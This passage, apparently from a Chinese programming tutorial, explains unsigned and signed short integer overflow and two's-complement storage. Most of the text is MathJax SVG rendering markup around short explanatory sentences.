60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(10391,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">数</text></g><g data-mml-node="mi" transform="translate(11391,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">据</text></g><g data-mml-node="mi" transform="translate(12391,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">类</text></g><g data-mml-node="mi" transform="translate(13391,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">型</text></g><g data-mml-node="mi" transform="translate(14391,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">的</text></g><g data-mml-node="mi" transform="translate(15391,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">空</text></g><g data-mml-node="mi" transform="translate(16391,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">间</text></g><g data-mml-node="mi" transform="translate(17391,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">是</text></g><g data-mml-node="mn" transform="translate(18391,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g><g data-mml-node="mi" transform="translate(19391,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">位</text></g><g data-mml-node="mi" transform="translate(20391,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(21391,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">最</text></g><g data-mml-node="mi" transform="translate(22391,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">高</text></g><g data-mml-node="mi" transform="translate(23391,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">位</text></g><g data-mml-node="mi" transform="translate(24391,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">的</text></g><g data-mml-node="mn" transform="translate(25391,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(25891,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">被</text></g><g data-mml-node="mi" transform="translate(26891,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">丢</text></g><g data-mml-node="mi" transform="translate(27891,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">弃</text></g><g data-mml-node="mi" transform="translate(28891,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(29891,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">因</text></g><g data-mml-node="mi" transform="translate(30891,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">此</text></g><g data-mml-node="mi" transform="translate(31891,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">只</text></g><g data-mml-node="mi" transform="translate(32891,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">保</text></g><g data-mml-node="mi" transform="translate(33891,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">留</text></g><g data-mml-node="mi" transform="translate(34891,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">了</text></g><g data-mml-node="mi" transform="translate(35891,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">低</text></g><g data-mml-node="mn" transform="translate(36891,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g><g data-mml-node="mi" transform="translate(37891,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">位</text></g><g data-mml-node="mi" transform="translate(38891,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(39891,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">即</text></g></g></g></svg></mjx-container>(0000000000000100)<em>2 = (4)</em>{10}$$；</li>
</ul>
</li>
<li><p>有符号</p>
<ul>
<li>  一个short类型的变量<code>a=32767</code>，当a累加5时会变成-32764；</li>
<li>  这是因为在计算机中，$$(32767)<em>{10} + (5)</em>{10} = (0111111111111111)_2 + (0000000000000101)_2 = (1000000000000100)_2<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="128.244ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 56684 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">而</text></g><g data-mml-node="mi" transform="translate(2000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">由</text></g><g data-mml-node="mi" transform="translate(3000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">于</text></g><g data-mml-node="mi" transform="translate(4000,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(4469,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mi" transform="translate(5045,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(5530,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(5981,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(6342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">数</text></g><g data-mml-node="mi" transform="translate(7342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">据</text></g><g data-mml-node="mi" transform="translate(8342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">类</text></g><g data-mml-node="mi" transform="translate(9342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">型</text></g><g data-mml-node="mi" transform="translate(10342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">的</text></g><g data-mml-node="mi" transform="translate(11342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">最</text></g><g data-mml-node="mi" transform="translate(12342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">高</text></g><g data-mml-node="mi" transform="translate(13342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">位</text></g><g data-mml-node="mi" transform="translate(14342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">为</text></g><g data-mml-node="mi" transform="translate(15342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">符</text></g><g data-mml-node="mi" transform="translate(16342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">号</text></g><g data-mml-node="mi" transform="translate(17342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">位</text></g><g data-mml-node="mi" transform="translate(18342,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mn" transform="translate(19342,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mi" transform="translate(19842,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">表</text></g><g data-mml-node="mi" transform="translate(20842,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">示</text></g><g data-mml-node="mi" transform="translate(21842,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">正</text></g><g data-mml-node="mi" transform="translate(22842,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">数</text></g><g data-mml-node="mi" transform="translate(23842,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mn" transform="translate(24842,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mi" transform="translate(25342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">表</text></g><g data-mml-node="mi" transform="translate(26342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">示</text></g><g data-mml-node="mi" transform="translate(27342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">负</text></g><g data-mml-node="mi" transform="translate(28342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">数</text></g><g data-mml-node="mi" transform="translate(29342,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(30342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">因</text></g><g data-mml-node="mi" transform="translate(31342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">此</text></g><g data-mml-node="mi" transform="translate(32342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">上</text></g><g data-mml-node="mi" transform="translate(33342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">式</text></g><g data-mml-node="mi" transform="translate(34342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">运</text></g><g data-mml-node="mi" transform="translate(35342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">算</text></g><g data-mml-node="mi" transform="translate(36342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">后</text></g><g data-mml-node="mi" transform="translate(37342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">超</text></g><g data-mml-node="mi" transform="translate(38342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">出</text></g><g data-mml-node="mi" transform="translate(39342,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">了</text></g><g data-mml-node="mi" transform="translate(40342,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(40811,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mi" transform="translate(41387,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(41872,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(42323,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(42684,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">类</text></g><g data-mml-node="mi" transform="translate(43684,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">型</text></g><g data-mml-node="mi" transform="translate(44684,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">的</text></g><g data-mml-node="mi" transform="translate(45684,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">数</text></g><g data-mml-node="mi" transform="translate(46684,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">据</text></g><g data-mml-node="mi" transform="translate(47684,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">范</text></g><g data-mml-node="mi" transform="translate(48684,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">围</text></g><g data-mml-node="mi" transform="translate(49684,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(50684,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">造</text></g><g data-mml-node="mi" transform="translate(51684,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">成</text></g><g data-mml-node="mi" transform="translate(52684,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">上</text></g><g data-mml-node="mi" transform="translate(53684,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">溢</text></g><g data-mml-node="mi" transform="translate(54684,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(55684,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">即</text></g></g></g></svg></mjx-container>(1000000000000100)<em>2 = (-32764)</em>{10}$$；</li>
<li>在计算机中，整数以补码形式存储，正数的补码与原码一致，负数的补码等于原码按位取反+1：<ul>
<li>  <mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="20.847ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 9214.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1000,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(1500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(2000,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(2500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(3000,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(3500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(4000,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(4500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(5000,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(5500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(6000,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(6500,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(7000,0)"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(7500,0)"></path></g><g data-mml-node="msub" transform="translate(8389,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mn" transform="translate(422,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>的补码，等于反码<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="19.716ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 8714.6 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 